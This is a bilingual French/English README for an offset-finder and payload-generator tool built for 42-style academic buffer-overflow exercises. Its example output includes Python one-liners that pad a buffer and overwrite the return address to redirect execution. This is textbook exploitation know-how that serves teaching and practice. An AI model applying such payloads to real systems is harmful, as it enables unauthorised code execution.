Offset Finder & Payload Generator

📝 Description (FR / EN)

FR : Cet outil a été développé dans le cadre d'études académiques (projets type 42) pour accompagner ceux qui souhaitent apprendre et pratiquer la cybersécurité. Il facilite l'exploitation de vulnérabilités liées à la mémoire (Buffer Overflow) en déterminant l'offset nécessaire pour écraser le registre d'instruction et en générant un script Python pour rediriger le flux d'exécution.

EN : This tool was developed for academic study purposes (such as 42 projects) to support those wishing to dive into cybersecurity. It simplifies the exploitation of memory vulnerabilities (Buffer Overflow) by finding the exact offset needed to overwrite the instruction register and generating a Python script to redirect the execution flow.
🛠️ Fonctionnement / How it Works

Étape / Step	FR	EN
1. Identify	Injectez la chaîne cyclique dans le programme cible.	Inject the cyclic string into the target program.
2. Locate	Récupérez l'adresse du crash (ex: 0x41414242) via GDB.	Retrieve the crash address (e.g., 0x41414242) via GDB.
3. Generate	L'outil calcule l'offset et crée le script de payload.	The tool calculates the offset and creates the payload script.

🚀 Utilisation / Usage

Terminal Mode
FR : Automatiser les tests de pénétration en passant les adresses en arguments :
EN : Automating the penetration tests by passing addresses as arguments:
```Bash
# python3 offset_finder.py <addr_crash> <addr_destination>
python3 offset_finder.py 0x54545454 0x080484a4
```


FR: Est Interactif / EN : Is Interactive :
```Bash
python3 offset_finder.py
```

💻 Exemple / Example
```
string : ...RRRRSSSSTTTT' UUUU 'VVVVWWWW...
offset : 112

script généré pour segfault:
python -c "print('A' * 112 + 'UUUU')"

écrire l'adresse à ajouter après l'offset : 0x080484a4
script généré pour executer adresse voulue:
python -c "print('A' * 112 + '\xa4\x84\x04\x08')"
```

⚠️ Disclaimer
```
FR : Cet outil est destiné à un usage purement éducatif ou pour des tests de cybersécurité défensive (sécurisation de code). L'auteur n'est pas responsable de toute utilisation malveillante.
EN : This tool is for educational purposes only or for defensive cybersecurity testing (code securing). The author is not responsible for any misuse or damage caused by this script.
```
